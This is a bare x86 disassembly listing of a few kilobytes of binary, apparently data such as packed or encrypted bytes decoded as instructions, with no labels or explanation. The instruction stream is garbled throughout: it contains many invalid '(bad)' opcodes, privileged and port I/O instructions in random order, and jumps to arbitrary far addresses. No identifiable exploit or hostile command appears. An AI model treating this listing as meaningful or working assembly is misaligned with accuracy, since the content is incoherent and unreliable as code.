  428d53:	mov    BYTE PTR [eax],ah
  428d55:	scas   eax,DWORD PTR es:[edi]
  428d56:	std    
  428d57:	mov    al,0x8f
  428d59:	stc    
  428d5a:	adc    BYTE PTR [esi+esi*2+0xc],dh
  428d5e:	and    BYTE PTR [edi-0xc],0xf9
  428d62:	icebp  
  428d63:	lea    ebx,[ecx+eax*1]
  428d66:	cmp    al,0x36
  428d68:	adc    BYTE PTR [ebx],bl
  428d6a:	sub    dh,BYTE PTR [esi+0xcb37]
	...
  428dd4:	add    BYTE PTR [eax],al
  428dd6:	xor    DWORD PTR [ebp+0x75f531f1],0xcc90b5c1
  428de0:	ins    BYTE PTR es:[edi],dx
  428de1:	retf   0x1598
  428de4:	or     al,0xa9
  428de6:	addr16 mov dh,0x1
  428de9:	add    BYTE PTR [eax],al
  428deb:	add    DWORD PTR [eax],eax
  428ded:	add    dh,al
  428def:	or     BYTE PTR [esp+eiz*8+0x50],dh
  428df3:	and    ebx,DWORD PTR [ebp-0x80]
  428df6:	jns    0x428dfa
  428df8:	jo     0x428e4b
  428dfa:	add    DWORD PTR [eax-0x2f9225c5],eax
  428e00:	mov    dh,0xc7
  428e02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428e03:	xchg   esi,eax
  428e04:	jmp    0x428d9b
  428e06:	pop    esi
  428e07:	pusha  
  428e08:	push   cs
  428e09:	mov    ah,0x45
  428e0b:	inc    esp
  428e0c:	stos   BYTE PTR es:[edi],al
  428e0d:	ins    BYTE PTR es:[edi],dx
  428e0e:	xor    ebp,ecx
  428e10:	ret    0x76d5
  428e13:	pop    ebp
  428e14:	mov    eax,0xb73c27b0
  428e19:	mov    dl,dh
  428e1b:	(bad)  
  428e1c:	test   eax,0x189ceed8
  428e21:	sbb    al,0xfa
  428e23:	aaa    
  428e24:	pop    ebp
  428e25:	neg    ch
  428e27:	push   edx
  428e28:	in     al,dx
  428e29:	sbb    eax,0x22e6a9d0
  428e2e:	aas    
  428e2f:	in     al,dx
  428e30:	push   edi
  428e31:	rcr    BYTE PTR [edi+0x79],0xaa
  428e35:	adc    cl,ah
  428e37:	out    0x5e,eax
  428e39:	push   es
  428e3a:	and    eax,ecx
  428e3c:	fs ret 
  428e3e:	jl     0x428e82
  428e40:	sbb    BYTE PTR [esi],dh
  428e42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428e43:	push   edx
  428e44:	out    0x77,al
  428e46:	jecxz  0x428e08
  428e48:	test   eax,0x53644af8
  428e4d:	hlt    
  428e4e:	bound  ebx,QWORD PTR [ebp-0x28cfec7f]
  428e54:	cmp    ebp,DWORD PTR [ecx+eax*1]
  428e57:	pop    DWORD PTR [edx]
  428e59:	mov    ah,0x47
  428e5b:	add    esp,DWORD PTR [edi]
  428e5d:	fst    DWORD PTR [eax]
  428e5f:	xlat   BYTE PTR ds:[ebx]
  428e60:	mov    dl,dl
  428e62:	xlat   BYTE PTR ds:[ebx]
  428e63:	cmp    eax,0x3ddd765b
  428e68:	cmp    ebx,DWORD PTR [esi]
  428e6a:	mov    edi,0x94c92e40
  428e6f:	pop    ds
  428e70:	mov    edi,0xfd636153
  428e75:	enter  0x5a65,0xf2
  428e79:	mov    esp,ss
  428e7b:	inc    ebp
  428e7c:	jecxz  0x428e3e
  428e7e:	lahf   
  428e7f:	test   BYTE PTR [edi+esi*4],ah
  428e82:	jl     0x428ead
  428e84:	es push ecx
  428e86:	mov    edx,0xe51dca18
  428e8b:	pop    es
  428e8c:	xchg   edi,eax
  428e8d:	mov    ch,0x43
  428e8f:	jg     0x428e3e
  428e91:	fisub  DWORD PTR [ebx-0xb9a4515]
  428e97:	ret    
  428e98:	inc    esi
  428e99:	mov    ds:0x857255e9,al
  428e9e:	sti    
  428e9f:	stos   BYTE PTR es:[edi],al
  428ea0:	lods   al,BYTE PTR ds:[esi]
  428ea1:	inc    al
  428ea3:	inc    edi
  428ea4:	add    al,0x7e
  428ea6:	and    eax,DWORD PTR [ebp-0x39]
  428ea9:	js     0x428e69
  428eab:	cmp    bl,BYTE PTR [edx+0x7b8114ec]
  428eb1:	call   0xdfdae0e5
  428eb6:	push   ecx
  428eb7:	and    ah,bl
  428eb9:	retf   0xf63c
  428ebc:	sar    DWORD PTR ds:0x1973fd90,1
  428ec2:	inc    edi
  428ec3:	sbb    al,0x65
  428ec5:	xchg   esp,eax
  428ec6:	mov    ebp,0xbf3e225
  428ecb:	xor    BYTE PTR [edi+0x2cbcb590],dl
  428ed1:	sbb    ebx,eax
  428ed3:	fimul  DWORD PTR ds:0xad95542a
  428ed9:	leave  
  428eda:	fldenv [edi]
  428edc:	arpl   bx,si
  428ede:	mov    ebx,0xa7e20b7
  428ee3:	enter  0x5eab,0x77
  428ee7:	xor    eax,0x4bf52e94
  428eec:	sub    BYTE PTR [ebx+0x0],dl
	...
  428f56:	dec    edi
  428f57:	pop    ebp
  428f58:	pop    ecx
  428f59:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428f5d:	fstp   st(1)
  428f5f:	ror    DWORD PTR [esp+edx*4],0x1c
  428f63:	pop    ebp
  428f64:	mov    ecx,0x1b76732
  428f69:	add    BYTE PTR [eax],al
  428f6b:	add    DWORD PTR [eax],eax
  428f6d:	add    BYTE PTR [ebx],bh
  428f6f:	ror    DWORD PTR [ebx-0x203ce6a3],cl
  428f75:	loop   0x428fc7
  428f77:	mov    ch,0xb3
  428f79:	push   DWORD PTR [esp+esi*2]
  428f7c:	rol    DWORD PTR [eax+0x52c20417],0xb3
  428f83:	out    0x48,eax
  428f85:	rcl    BYTE PTR [edi+0x7c4a3f6b],1
  428f8b:	gs jno 0x428fef
  428f8e:	sbb    DWORD PTR [ebp+0x7a],ecx
  428f91:	(bad)  
  428f92:	out    dx,al
  428f93:	test   eax,0x48700c2a
  428f98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428f99:	call   0x30b2b75d
  428f9e:	imul   edi,DWORD PTR ds:0x4041405d,0x38
  428fa5:	xchg   esp,eax
  428fa6:	mov    dl,0x16
  428fa8:	ffreep st(1)
  428faa:	ss popf 
  428fac:	pusha  
  428fad:	dec    edx
  428fae:	inc    ebx
  428faf:	inc    ecx
  428fb0:	retf   0x9fac
  428fb3:	jge    0x428fb4
  428fb5:	icebp  
  428fb6:	(bad)  
  428fb7:	jg     0x428ff4
  428fb9:	scas   al,BYTE PTR es:[edi]
  428fba:	jmp    0xb4956bf3
  428fbf:	(bad)  [eax-0x3bb940ea]
  428fc5:	cmp    esp,DWORD PTR [ebx-0x55]
  428fc8:	(bad)  [ecx]
  428fca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428fcb:	mov    ebx,0x3e3479a4
  428fd0:	ins    DWORD PTR es:[edi],dx
  428fd1:	ret    
  428fd2:	push   cs
  428fd3:	sub    al,ah
  428fd5:	rcr    DWORD PTR [eax+0x2c],cl
  428fd8:	pop    esi
  428fd9:	mov    edi,0x3b8766c8
  428fde:	add    eax,0x9eb8ca31
  428fe3:	dec    edx
  428fe4:	cdq    
  428fe5:	into   
  428fe6:	jns    0x428f99
  428fe8:	add    ecx,0x74f8094c
  428fee:	cdq    
  428fef:	std    
  428ff0:	lock das 
  428ff2:	jp     0x428feb
  428ff4:	cdq    
  428ff5:	jecxz  0x429061
  428ff7:	test   eax,0x7d65dba4
  428ffc:	daa    
  428ffd:	cmp    DWORD PTR [eax-0x7337ad5e],edx
  429003:	inc    ebx
  429004:	mov    bh,0xdb
  429006:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429007:	ins    BYTE PTR es:[edi],dx
  429008:	test   al,0x3e
  42900a:	mov    ds:0xd85ed863,eax
  42900f:	not    BYTE PTR [ecx+edi*4]
  429012:	push   eax
  429013:	adc    al,0xfb
  429015:	mov    BYTE PTR [ebx],bl
  429017:	or     BYTE PTR [edi],cl
  429019:	lds    esi,FWORD PTR [eax+ecx*4]
  42901c:	sbb    edi,edx
  42901e:	mov    edi,esp
  429020:	dec    ecx
  429021:	clc    
  429022:	out    0x41,al
  429024:	out    0xc8,al
  429026:	mov    WORD PTR [esp+eax*1-0x5f4f34da],?
  42902d:	dec    esp
  42902e:	inc    ebp
  42902f:	and    bh,0xa2
  429032:	pop    edx
  429033:	add    DWORD PTR [ebp+0x8],edi
  429036:	sub    al,0xa2
  429038:	rcl    ch,0x12
  42903b:	es fsubr st(6),st
  42903e:	pop    ds
  42903f:	popf   
  429040:	lock jecxz 0x429028
  429043:	(bad)  
  429044:	jno    0x42908d
  429046:	inc    ebx
  429047:	test   DWORD PTR ds:0xebef23ab,0xedb04246
  429051:	mov    esi,0x5bf53d57
  429056:	inc    eax
  429057:	hlt    
  429058:	std    
  429059:	mov    eax,ds:0xab13d21e
  42905e:	pop    ecx
  42905f:	repz push ecx
  429061:	cmp    DWORD PTR ds:0x42147a27,ecx
  429067:	add    ah,BYTE PTR [edx-0x19]
  42906a:	and    BYTE PTR [ecx-0x5a],0x21
	...
  4290d6:	loope  0x4290c4
  4290d8:	mov    ebx,es
  4290da:	(bad)  
  4290db:	jecxz  0x4290cc
  4290dd:	out    dx,al
  4290de:	mov    edi,0x31fc7b77
  4290e3:	test   DWORD PTR [esp+esi*2+0x67],eax
  4290e7:	mov    eax,0x1000001
  4290ec:	add    BYTE PTR [eax],al
  4290ee:	jle    0x42915b
  4290f0:	push   ss
  4290f1:	arpl   si,si
  4290f3:	inc    ecx
  4290f4:	jno    0x4290b4
  4290f6:	ja     0x4290f4
  4290f8:	jle    0x42912a
  4290fa:	(bad)  [esi+0x53298eda]
  429100:	jmp    0x95a8e0e9
  429105:	leave  
  429106:	add    cl,BYTE PTR [esi+0x56a5de56]
  42910c:	les    ecx,FWORD PTR [edx]
  42910e:	iret   
  42910f:	inc    esi
  429110:	xchg   edi,eax
  429111:	test   al,0x38
  429113:	or     DWORD PTR [ecx+0x66dd9473],esi
  429119:	add    dl,BYTE PTR [ebx+0x4c]
  42911c:	ret    0xe6c8
  42911f:	jl     0x4290f2
  429121:	adc    eax,0x93c44ffe
  429126:	mov    edi,0xe0b8a9e6
  42912b:	and    bh,BYTE PTR [edx+0x45]
  42912e:	mov    ch,0x59
  429130:	ins    BYTE PTR es:[edi],dx
  429131:	dec    ecx
  429132:	repnz addr16 sahf 
  429135:	mov    ecx,0xaea23b8e
  42913a:	mov    bl,dl
  42913c:	xchg   esp,eax
  42913d:	jne    0x429104
  42913f:	mov    bl,0x3d
  429141:	pop    ds
  429142:	or     eax,0x4059c69
  429147:	xchg   al,bh
  429149:	popf   
  42914a:	fiadd  DWORD PTR [eax]
  42914c:	clc    
  42914d:	pop    edx
  42914e:	or     dl,ch
  429150:	mov    ebx,0xc3a7925
  429155:	lea    ecx,[ebx-0x56]
  429158:	cmp    eax,0x6b915e29
  42915d:	add    al,0x83
  42915f:	cdq    
  429160:	fadd   DWORD PTR [esi+eiz*8+0x2b87d08d]
  429167:	test   BYTE PTR [eax+edi*4-0x6f],dl
  42916b:	inc    ecx
  42916c:	pop    edx
  42916d:	fdivr  st(7),st
  42916f:	xor    eax,0xa710204f
  429174:	test   al,0x67
  429176:	or     al,0xe6
  429178:	ret    0xa8e2
  42917b:	xor    esi,edi
  42917d:	(bad)
  429181:	cld    
  429182:	in     eax,0xcb
  429184:	inc    edi
  429185:	es nop
  429187:	in     eax,dx
  429188:	cmp    ah,BYTE PTR [edi]
  42918a:	jecxz  0x42918f
  42918c:	fistp  DWORD PTR [edx+0x66d47bd1]
  429192:	adc    eax,DWORD PTR [esi+0x15802d19]
  429198:	and    al,0x5f
  42919a:	dec    ebx
  42919b:	sub    DWORD PTR [edx-0x3c],ecx
  42919e:	(bad)  
  42919f:	push   ebp
  4291a0:	mov    ds,WORD PTR [edi]
  4291a2:	pusha  
  4291a3:	outs   dx,DWORD PTR ds:[esi]
  4291a4:	and    ecx,eax
  4291a6:	jnp    0x4291b4
  4291a8:	sub    ch,0xd0
  4291ab:	push   0x8d959341
  4291b0:	lods   eax,DWORD PTR ds:[esi]
  4291b1:	and    eax,0x81a8fdc9
  4291b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4291b7:	test   al,0xea
  4291b9:	(bad)  
  4291ba:	mov    edi,0x62d7571a
  4291bf:	pop    esp
  4291c0:	add    eax,0xea578dd8
  4291c5:	sbb    esp,DWORD PTR [ebx]
  4291c7:	jg     0x42915c
  4291c9:	test   eax,0x1ecfcf
  4291ce:	add    edi,ebx
  4291d0:	inc    ecx
  4291d1:	jp     0x429210
  4291d3:	dec    esi
  4291d4:	dec    eax
  4291d5:	mov    edi,0x74546528
  4291da:	dec    edx
  4291db:	(bad)  
  4291dc:	cs add ch,ch
  4291df:	aaa    
  4291e0:	inc    edi
  4291e1:	(bad)  
  4291e2:	out    0xb3,eax
  4291e4:	adc    ebp,DWORD PTR [ebx]
  4291e6:	xor    edi,DWORD PTR [ebp+0x21d29797]
  4291ec:	pop    esp
  4291ed:	add    DWORD PTR [eax],eax
	...
  429253:	add    BYTE PTR [eax],al
  429255:	add    BYTE PTR [esi-0x79],dl
  429258:	std    
  429259:	test   ch,bh
  42925b:	(bad)  
  42925c:	jg     0x429235
  42925e:	into   
  42925f:	retf   
  429260:	or     DWORD PTR [edi+ebx*2+0x670f234b],0x1b9
  42926b:	add    DWORD PTR [eax],eax
  42926d:	add    BYTE PTR [ebp+ebx*1-0xc250a7b],dl
  429274:	push   ebp
  429275:	test   BYTE PTR [esi],dl
  429277:	jg     0x4292da
  429279:	aad    0xae
  42927b:	fprem  
  42927d:	adc    BYTE PTR [ebx-0x5b],cl
  429280:	mov    eax,0xf6b5114d
  429285:	dec    edx
  429286:	inc    esp
  429287:	imul   ecx,DWORD PTR [edx-0x5ba1b2aa],0xffffffba
  42928e:	sahf   
  42928f:	fdiv   DWORD PTR [edx+0x26]
  429292:	mov    ebp,0x80527805
  429297:	test   edx,esp
  429299:	sbb    eax,0x7fe89251
  42929e:	jmp    0x612b5793
  4292a3:	or     cl,dh
  4292a5:	inc    edx
  4292a6:	mov    dl,0x35
  4292a8:	or     al,0xe0
  4292aa:	mov    ds:0xd0e16e74,eax
  4292af:	xchg   esp,eax
  4292b0:	aas    
  4292b1:	rol    bh,0x17
  4292b4:	mov    eax,0xe5966e12
  4292b9:	ins    DWORD PTR es:[edi],dx
  4292ba:	fild   DWORD PTR [ebx+ebx*8-0x6f]
  4292be:	cmp    BYTE PTR ds:0xf15db944,0x12
  4292c5:	mov    eax,ds:0x93cc9cd2
  4292ca:	das    
  4292cb:	into   
  4292cc:	nop
  4292cd:	sub    BYTE PTR [eax+ebx*4-0x27],ch
  4292d1:	xor    dl,BYTE PTR [ebx-0x2509f614]
  4292d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4292d8:	cmp    DWORD PTR [edx-0x36],ebp
  4292db:	dec    edi
  4292dc:	aas    
  4292dd:	push   edx
  4292de:	and    BYTE PTR [edi-0xf],cl
  4292e1:	cs pushf 
  4292e3:	lods   al,BYTE PTR ds:[esi]
  4292e4:	test   eax,0x8f5434ee
  4292e9:	jmp    0x521771de
  4292ee:	cmp    ah,0x9e
  4292f1:	mov    esp,0xf3f23b33
  4292f6:	mov    al,ds:0x6970451f
  4292fb:	inc    esi
  4292fc:	out    0xed,eax
  4292fe:	in     al,dx
  4292ff:	or     al,0x3
  429301:	in     al,0x95
  429303:	dec    esp
  429304:	and    DWORD PTR [esi-0x3ce13d1b],edi
  42930a:	lods   eax,DWORD PTR ds:[esi]
  42930b:	mov    edx,es
  42930d:	shl    ebx,cl
  42930f:	inc    eax
  429310:	mov    ds:0x9fe55fe3,eax
  429315:	push   ebp
  429316:	adc    DWORD PTR [ebp+0x434357a2],edi
  42931c:	xchg   ecx,eax
  42931d:	or     al,0xe3
  42931f:	cwde   
  429320:	loopne 0x42933e
  429322:	pusha  
  429323:	jnp    0x4292b9
  429325:	(bad)  
  429326:	push   ebp
  429327:	xor    edx,DWORD PTR [ebp-0x3bdb0535]
  42932d:	imul   esi,DWORD PTR [edi+0x3d],0xffffff80
  429331:	cmp    eax,esi
  429333:	retf   0x8f11
  429336:	add    al,0xb
  429338:	lods   al,BYTE PTR ds:[esi]
  429339:	jecxz  0x429378
  42933b:	jae    0x429378
  42933d:	dec    edi
  42933e:	ins    BYTE PTR es:[edi],dx
  42933f:	fld    DWORD PTR fs:[ebx]
  429342:	sbb    DWORD PTR [edx-0x30],eax
  429345:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429346:	sbb    edx,esi
  429348:	cmp    eax,0x9844236e
  42934d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42934e:	mov    esi,0x9079fe3a
  429353:	js     0x4293c9
  429355:	mov    bh,BYTE PTR ds:0x6f96cd92
  42935b:	and    al,BYTE PTR [edx]
  42935d:	stos   DWORD PTR es:[edi],eax
  42935e:	inc    edi
  42935f:	loopne 0x4293ac
  429361:	out    dx,eax
  429362:	rcr    ah,0x80
  429365:	push   es
  429366:	dec    eax
  429367:	icebp  
  429368:	jmp    0xbc0afceb
  42936d:	mov    ebp,0x0
	...
  4293d6:	lock adc al,0xe1
  4293d9:	(bad)  
  4293da:	in     eax,0xff
  4293dc:	call   FWORD PTR [esi]
  4293de:	jae    0x4293e5
  4293e0:	dec    edx
  4293e1:	mov    bh,0xbe
  4293e3:	frstor [eax+esi*2+0x1ba67]
  4293ea:	add    BYTE PTR [ecx],al
  4293ec:	add    BYTE PTR [eax],al
  4293ee:	xchg   esp,eax
  4293ef:	(bad)  
  4293f1:	sbb    eax,0x4edd4302
  4293f6:	popf   
  4293f7:	sub    BYTE PTR ds:0x98689d3d,al
  4293fd:	mov    ds:0x7cef8c55,eax
  429402:	mov    ch,0x7d
  429404:	xor    eax,DWORD PTR [edi+0x6c]
  429407:	out    0xbd,al
  429409:	add    esp,DWORD PTR ds:0xdd20e55a
  42940f:	mov    dl,dl
  429411:	cmp    DWORD PTR [esi-0x1c28fc8f],0xffffffd4
  429418:	ret    
  429419:	push   esp
  42941a:	imul   edi,DWORD PTR [esi-0x553a2718],0xffffffa4
  429421:	in     al,dx
  429422:	popa   
  429423:	lods   al,BYTE PTR ds:[esi]
  429424:	adc    eax,0x63148bd7
  429429:	les    esi,FWORD PTR [esi-0x24]
  42942c:	dec    eax
  42942d:	nop
  42942e:	pop    ecx
  42942f:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  429431:	pop    edx
  429432:	mov    ah,0xa9
  429434:	mov    dl,0xcf
  429436:	xchg   ecx,eax
  429437:	test   eax,0x45ad38c2
  42943c:	popa   
  42943d:	pusha  
  42943e:	loop   0x42943f
  429440:	imul   ebx,DWORD PTR [ecx-0x3c],0xffffffbd
  429444:	loope  0x429493
  429446:	push   cs
  429447:	ins    DWORD PTR es:[edi],dx
  429448:	inc    eax
  429449:	call   0xdcdc:0x8a5ae419
  429450:	sbb    eax,0x524cf648
  429455:	addr16 mov ecx,0xca4b67e3
  42945b:	stc    
  42945c:	in     eax,0x8e
  42945e:	inc    ebp
  42945f:	mov    dh,0x16
  429461:	xchg   edi,eax
  429462:	test   al,0x6a
  429464:	lahf   
  429465:	inc    edi
  429466:	not    DWORD PTR [edx+0x31]
  429469:	mov    ebp,0x80963ad3
  42946e:	cli    
  42946f:	mov    ebx,0x16e2ffb4
  429474:	pop    ds
  429475:	(bad)
  42947a:	cmp    eax,0x4f701cba
  42947f:	(bad)  
  429480:	jo     0x429466
  429482:	xchg   edi,eax
  429483:	jmp    0x7eaf:0xf424e809
  42948a:	in     eax,0xa7
  42948c:	loope  0x4294c7
  42948e:	fwait
  42948f:	inc    ebp
  429490:	repnz push ds
  429492:	dec    ebx
  429493:	jno    0x429472
  429495:	mov    ebp,cs
  429497:	es (bad) 
  429499:	shr    DWORD PTR [ebp+eiz*2+0x765b3a1e],cl
  4294a0:	add    ebp,DWORD PTR [edx-0x136d6ce1]
  4294a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4294a7:	cmp    cl,BYTE PTR [edi]
  4294a9:	xchg   DWORD PTR [esi+eax*8+0x89c787f],esp
  4294b0:	mov    ecx,?
  4294b2:	imul   edi,DWORD PTR [ecx+0x7b],0x17dc18c4
  4294b9:	jg     0x42950c
  4294bb:	sub    eax,0xdb2e4c7d
  4294c0:	clc    
  4294c1:	cld    
  4294c2:	jns    0x42950a
  4294c4:	popa   
  4294c5:	loope  0x42953a
  4294c7:	mov    dh,0x24
  4294c9:	ret    0x73f8
  4294cc:	pop    eax
  4294cd:	push   es
  4294ce:	mov    bh,0x12
  4294d0:	cmp    ebp,DWORD PTR [ebp-0x39]
  4294d3:	mov    ah,0xe5
  4294d5:	test   DWORD PTR [edx],0x4f101cd5
  4294db:	xchg   DWORD PTR [eax-0x5e],eax
  4294de:	fidiv  WORD PTR [ebx+esi*2]
  4294e1:	test   eax,0x1affdcea
  4294e6:	dec    esp
  4294e7:	(bad)  
  4294e8:	test   al,0x48
  4294ea:	nop
  4294eb:	or     al,0x42
  4294ed:	repz add BYTE PTR [eax],al
	...
  429554:	add    BYTE PTR [eax],al
  429556:	dec    esp
  429557:	or     eax,0x3e532c13
  42955c:	jg     0x4295cb
  42955e:	dec    esp
  42955f:	arpl   WORD PTR [ebp-0x37a5a716],dx
  429565:	and    BYTE PTR [edi-0x45],ah
  429568:	add    DWORD PTR [eax],eax
  42956a:	add    BYTE PTR [ecx],al
  42956c:	add    BYTE PTR [eax],al
  42956e:	sti    
  42956f:	push   esi
  429570:	nop
  429571:	aad    0x49
  429573:	daa    
  429574:	cs jb  0x429585
  429577:	push   ebp
  429578:	aam    0xa8
  42957a:	fist   DWORD PTR [edi]
  42957c:	and    DWORD PTR [ecx+edx*4-0x9],0xffffffaf
  429581:	(bad)  
  429582:	adc    bl,BYTE PTR [esi-0x570497f2]
  429588:	imul   eax,DWORD PTR [esi],0xea24073e
  42958e:	mov    ch,0x3c
  429590:	int    0x57
  429592:	xchg   ebx,eax
  429593:	sbb    eax,0x6b45a46d
  429598:	test   DWORD PTR [edi],ebp
  42959a:	mov    al,ds:0x2fdaf997
  42959f:	xchg   DWORD PTR [edi-0x32f550f3],eax
  4295a5:	rcr    BYTE PTR [ebx],1
  4295a7:	jae    0x4295f2
  4295a9:	xchg   ebx,eax
  4295aa:	mov    ch,0x49
  4295ac:	test   al,0x45
  4295ae:	adc    eax,0x57a033e6
  4295b3:	es fs xor ah,BYTE PTR es:[ecx-0x40]
  4295b9:	aam    0xc7
  4295bb:	stos   BYTE PTR es:[edi],al
  4295bc:	mov    ebx,0x89c8044
  4295c1:	(bad)  [esi+0x3c]
  4295c4:	sti    
  4295c5:	adc    BYTE PTR [edx+0x5758fa55],al
  4295cb:	or     al,dh
  4295cd:	mov    ds:0x638e1098,al
  4295d2:	jb     0x42957b
  4295d4:	add    eax,0xe393946b
  4295d9:	and    al,0x98
  4295db:	loopne 0x429605
  4295dd:	into   
  4295de:	mov    cl,0x45
  4295e0:	int    0xfc
  4295e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4295e3:	add    al,0x6a
  4295e5:	cwde   
  4295e6:	jae    0x429635
  4295e8:	int3   
  4295e9:	jne    0x4295e0
  4295eb:	outs   dx,DWORD PTR ds:[esi]
  4295ec:	lds    ebx,FWORD PTR [ebx+0x255c7fd8]
  4295f2:	add    esi,DWORD PTR [ebx+ecx*8+0x2677921]
  4295f9:	test   eax,0xc1e21b3e
  4295fe:	sbb    al,BYTE PTR [edx-0x58]
  429601:	push   0xffffffad
  429603:	test   DWORD PTR [edx+0x35b20d5c],ebp
  429609:	mov    esi,0xab1ab3f4
  42960e:	jl     0x429649
  429610:	mov    al,ds:0xe38e0528
  429615:	loop   0x42965f
  429617:	and    DWORD PTR [edx+0x37],0x20
  42961b:	outs   dx,DWORD PTR ds:[esi]
  42961c:	(bad)  [ebp+0x1e]
  42961f:	mov    edx,0xe4539bef
  429624:	popf   
  429625:	sbb    eax,0x23a9ab4a
  42962a:	enter  0xba7,0x86
  42962e:	jno    0x4295c7
  429630:	shl    DWORD PTR [eax-0x5258cd1],0xc1
  429637:	push   esp
  429638:	sbb    eax,0x98b55375
  42963d:	aas    
  42963e:	push   esi
  42963f:	push   esi
  429640:	inc    ebp
  429641:	shl    DWORD PTR [esi+edx*4-0x55e10f4e],0xb7
  429649:	and    bl,BYTE PTR [ebp+0x24]
  42964c:	icebp  
  42964d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42964e:	xor    esi,DWORD PTR [ecx+0x606ae443]
  429654:	repz xlat BYTE PTR ds:[ebx]
  429656:	js     0x429689
  429658:	sti    
  429659:	pop    esp
  42965a:	push   es
  42965b:	inc    ebx
  42965c:	and    BYTE PTR [edx+0x7ff1014c],0xda
  429663:	(bad)  
  429664:	xchg   ebx,eax
  429665:	sbb    bh,ah
  429667:	into   
  429668:	mov    ecx,0x1cd89308
  42966d:	cld    
	...
  4296d6:	ins    DWORD PTR es:[edi],dx
  4296d7:	sbb    eax,0xfbf6c0e6
  4296dc:	outs   dx,DWORD PTR ds:[esi]
  4296dd:	mov    ebp,0xab7b5cea
  4296e2:	or     eax,0x672b14b2
  4296e7:	mov    esp,0x1000001
  4296ec:	add    BYTE PTR [eax],al
  4296ee:	test   BYTE PTR [esp+ebp*4+0x77],dl
  4296f2:	pop    esi
  4296f3:	pop    esi
  4296f4:	lods   al,BYTE PTR ds:[esi]
  4296f5:	fwait
  4296f6:	mov    ebp,0x5b0e59d6
  4296fb:	popa   
  4296fc:	mov    ebp,0xb2ad53ab
  429701:	mov    dh,0x8a
  429703:	mov    ds:0xfbb9b180,al
  429708:	jle    0x4296dc
  42970a:	cmc    
  42970b:	and    BYTE PTR [ecx+ebx*2],dl
  42970e:	sbb    DWORD PTR [esi-0x4a],ebx
  429711:	ret    0x8719
  429714:	mov    esp,0x2b038c86
  429719:	fimul  WORD PTR [edx+0x35]
  42971c:	cwde   
  42971d:	scas   al,BYTE PTR es:[edi]
  42971e:	rcr    DWORD PTR [esp+edx*4-0x315f64a0],0x1e
  429726:	mov    ebp,DWORD PTR [edi-0x2182b387]
  42972c:	inc    BYTE PTR ds:0x3ceaabe9
  429732:	push   eax
  429733:	dec    eax
  429734:	ins    DWORD PTR es:[edi],dx
  429735:	cmp    eax,0x128ebf97
  42973a:	mov    ch,0x1d
  42973c:	push   edx
  42973d:	add    eax,0xeaab7887
  429742:	add    edx,DWORD PTR [edi+0x4f]
  429745:	xchg   DWORD PTR [eax],eax
  429747:	mov    ebp,0x74a6af23
  42974c:	arpl   WORD PTR [esi+ebp*1-0x69],ax
  429750:	xchg   DWORD PTR [esp+edi*1+0x76da4cfe],esp
  429757:	lds    ebx,FWORD PTR ds:0x73d980d9
  42975d:	sti    
  42975e:	cmovs  ecx,DWORD PTR [eax+ecx*2-0x1fd613ed]
  429766:	xor    bh,BYTE PTR [edi+ebp*1-0x732d29]
  42976d:	sti    
  42976e:	sub    DWORD PTR [edx-0x2e],0x65
  429772:	sti    
  429773:	inc    ecx
  429774:	ds mov ebp,esp
  429777:	jmp    0x1589:0x7bdc83da
  42977e:	fidivr DWORD PTR [edx-0x4d17171b]
  429784:	mov    es,WORD PTR [ebx-0x33]
  429787:	or     BYTE PTR [edx-0x2a],cl
  42978a:	call   DWORD PTR [edx-0x2d]
  42978d:	jmp    0xca696fec
  429792:	ss and ecx,edi
  429795:	retf   
  429796:	outs   dx,DWORD PTR ds:[esi]
  429797:	xor    ch,dl
  429799:	lods   al,BYTE PTR ds:[esi]
  42979a:	ror    BYTE PTR [ecx],0x55
  42979d:	les    esp,FWORD PTR [esp+ecx*4+0x70]
  4297a1:	xchg   DWORD PTR [ecx],esi
  4297a3:	xchg   esi,eax
  4297a4:	mov    cl,0xc5
  4297a6:	hlt    
  4297a7:	lock (bad) 
  4297a9:	jmp    0x4809:0x91c60b10
  4297b0:	dec    ebp
  4297b1:	xchg   edx,eax
  4297b2:	leave  
  4297b3:	aad    0xe3
  4297b5:	sub    DWORD PTR [ebp-0x10789cf6],esi
  4297bb:	cmc    
  4297bc:	xchg   ebp,eax
  4297bd:	shr    dl,0xe3
  4297c0:	inc    edi
  4297c1:	repz mov ecx,0x5cc8b49d
  4297c7:	ja     0x42983a
  4297c9:	and    dh,cl
  4297cb:	adc    eax,0x11b31dad
  4297d0:	scas   eax,DWORD PTR es:[edi]
  4297d1:	inc    edi
  4297d2:	mov    ah,0x52
  4297d4:	jmp    FWORD PTR [ecx-0x57]
  4297d7:	inc    esp
  4297d8:	xchg   edi,eax
  4297d9:	scas   eax,DWORD PTR es:[edi]
  4297da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4297db:	add    DWORD PTR [ebx+0x6f],eax
  4297de:	inc    ebx
  4297df:	xor    al,0x50
  4297e1:	outs   dx,BYTE PTR ds:[esi]
  4297e2:	jmp    0x61d9:0x4f2545d0
  4297e9:	mov    DWORD PTR [edx],ebx
  4297eb:	pop    DWORD PTR [ebp-0x3f]
	...
  429856:	xor    BYTE PTR [edx-0x21],al
  429859:	(bad)  
  42985a:	(bad)  
  42985b:	(bad)  
  42985c:	mov    ebp,0x1d164c52
  429861:	pop    ebp
  429862:	xor    al,0x1e
  429864:	stos   DWORD PTR es:[edi],eax
  429865:	or     BYTE PTR [edi-0x43],ah
  429868:	add    DWORD PTR [eax],eax
  42986a:	add    BYTE PTR [ecx],al
  42986c:	add    BYTE PTR [eax],al
  42986e:	cmp    eax,0x366b02f2
  429873:	xchg   esi,eax
  429874:	imul   esp,DWORD PTR [eax],0xecaa368e
  42987a:	ret    0xbfc1
  42987d:	add    BYTE PTR [esi+0x4323b0bf],ch
